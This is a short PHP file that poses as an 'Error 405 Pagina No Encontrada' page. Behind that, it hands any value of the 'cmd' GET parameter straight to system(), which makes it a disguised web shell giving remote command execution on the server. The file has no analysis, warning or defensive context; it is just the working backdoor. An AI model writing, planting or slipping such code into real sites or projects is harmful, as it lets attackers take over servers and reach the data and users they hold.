<!DOCTYPE html>
<form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>">
<pre>
<i><h4 style="color:black; background:#dde3ca; width:230px; padding:3px;">Error 405 Pagina No Encontrada :/</i></h4>
<?php
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
?>
</pre>